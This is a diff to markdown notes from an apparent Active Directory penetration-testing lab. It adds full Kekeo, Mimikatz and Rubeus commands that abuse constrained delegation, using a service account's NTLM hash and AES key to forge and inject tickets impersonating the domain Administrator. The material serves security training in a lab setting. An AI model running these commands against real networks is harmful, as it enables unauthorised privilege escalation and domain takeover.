@@ -196,9 +196,40 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"}
 ```
 
 #### Attacks
-Abusing with Kekeo
-• Either plaintext password or NTLM hash/AES keys is required. We already have
-access to websvc's hash from dcorp-adminsrv
-• Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
+__Kekeo__
+- Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc's hash from dcorp-adminsrv
+- Using asktgt from Kekeo, we request a TGT:
+```powershell
+tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local
+/rc4:cc098f204c5887eaa8253e7c2749156f
+```
+- Using s4u from Kekeo, we request a TGS:
+```powershell
+tgs::s4u
+/tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneyco
+rp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
+/user:Administrator@dollarcorp.moneycorp.local 
+/service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
+```
+
+__Mimikatz__
+```powershell
+Invoke-Mimikatz -Command '"kerberos::ptt
+TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.
+MONEYCORP.LOCAL_cifs~dcorp-
+mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LO
+CAL.kirbi"'
+```
+
+__Rubeus__
+- We are requesting a TGT and TGS in a single command:
+```powershell
+Rubeus.exe s4u /user:websvc
+/aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e87
+9470ade07e5412d7 
+/impersonateuser:Administrator
+/msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL
+/ptt
+```
 
 
